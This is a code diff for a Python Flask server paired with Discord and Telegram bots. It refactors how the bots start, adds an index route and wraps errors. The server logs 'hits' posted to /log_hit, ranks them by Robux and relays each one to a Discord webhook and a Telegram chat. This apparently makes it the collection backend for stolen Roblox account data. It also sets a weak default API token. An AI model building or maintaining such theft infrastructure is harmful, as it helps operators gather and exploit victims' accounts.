@@ -6,15 +6,14 @@ import time
 import requests
 from datetime import datetime
 from flask import Flask, request, jsonify
-
-# ---------- CONFIG (Set these via Render environment variables) ----------
 import os
 
-DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "YOUR_DISCORD_BOT_TOKEN")
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
+# ---------- CONFIG (via Render environment variables) ----------
+DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "-5330491816")
-ENABLE_TELEGRAM = True if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID else False
-DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")  # optional
+ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
 API_TOKEN = os.environ.get("API_TOKEN", "123")
 
 DB_FILE = "hits.db"
@@ -66,7 +65,7 @@ def get_top_robux():
     conn.close()
     return row if row else (None, 0)
 
-# ---------- Discord Webhook (hit notification) ----------
+# ---------- Discord Webhook ----------
 def send_discord_webhook(hit):
     if not DISCORD_WEBHOOK_URL:
         return
@@ -85,9 +84,36 @@ def send_discord_webhook(hit):
     except Exception as e:
         print(f"[Webhook] Error: {e}")
 
-# ---------- Flask Server ----------
+# ---------- Flask App ----------
 app = Flask(__name__)
 
+# Flag to ensure bots only start once
+_bots_started = False
+
+def start_bots():
+    """Start Discord and Telegram bots in background threads."""
+    global _bots_started
+    if _bots_started:
+        return
+    _bots_started = True
+    
+    # Small delay to let Flask initialize properly
+    time.sleep(2)
+    
+    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
+        threading.Thread(target=run_discord_bot, daemon=True).start()
+        print("[Bots] Discord bot started.")
+    
+    if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
+        threading.Thread(target=run_telegram_bot, daemon=True).start()
+        print("[Bots] Telegram bot started.")
+
+# Start bots on the first request (after Flask is ready)
+@app.before_request
+def before_first_request():
+    start_bots()
+
+# ---------- Routes ----------
 @app.route('/log_hit', methods=['POST'])
 def log_hit():
     data = request.get_json()
@@ -120,6 +146,10 @@ def top():
         return jsonify({"error": "Unauthorized"}), 401
     user, robux = get_top_robux()
     return jsonify({"username": user, "robux": robux})
+
+@app.route('/')
+def index():
+    return jsonify({"status": "Server is running", "endpoints": ["/log_hit", "/get_hits", "/total", "/top"]})
 
 # ---------- Discord Bot ----------
 def run_discord_bot():
@@ -197,7 +227,10 @@ def run_discord_bot():
 """
         await ctx.send(help_text)
 
-    bot.run(DISCORD_TOKEN)
+    try:
+        bot.run(DISCORD_TOKEN)
+    except Exception as e:
+        print(f"[Discord] Bot error: {e}")
 
 # ---------- Telegram Bot ----------
 def run_telegram_bot():
@@ -270,34 +303,23 @@ def run_telegram_bot():
         print("[Telegram] Bot started polling.")
         app_tele.run_polling()
     except Exception as e:
-        print(f"[Telegram] Error: {e}")
+        print(f"[Telegram] Bot error: {e}")
 
-# ---------- Startup logic for Render (and local) ----------
-def start_bots():
-    # Give Flask a moment to start if we're on Render
-    time.sleep(2)
-    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
-        threading.Thread(target=run_discord_bot, daemon=True).start()
-    if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
-        threading.Thread(target=run_telegram_bot, daemon=True).start()
-
-# ---------- Main ----------
+# ---------- Local Development ----------
 if __name__ == "__main__":
-    # Local development: run with --server to start Flask + bots
+    # For local testing: python server_bot.py --server
     if len(sys.argv) > 1 and sys.argv[1] == "--server":
         init_db()
         # Start Flask in a thread
         threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':5000,'debug':False}, daemon=True).start()
+        # Start bots after a delay
+        time.sleep(2)
         start_bots()
         # Keep main thread alive
         while True:
             time.sleep(1)
     else:
-        # On Render, gunicorn will start Flask; we start bots after Flask loads
-        # but we need to run them after app is ready. We'll start them at import time.
-        # However, to avoid starting bots when gunicorn just imports (for workers), we check if we are in the main process.
-        # For simplicity, we start bots here – gunicorn will run this code.
+        # For Render: gunicorn will run the app
         print("Starting server (gunicorn) ...")
         init_db()
-        start_bots()
-        # gunicorn will run the app, no need to call app.run()
+        # Bots will be started on first request via @app.before_request
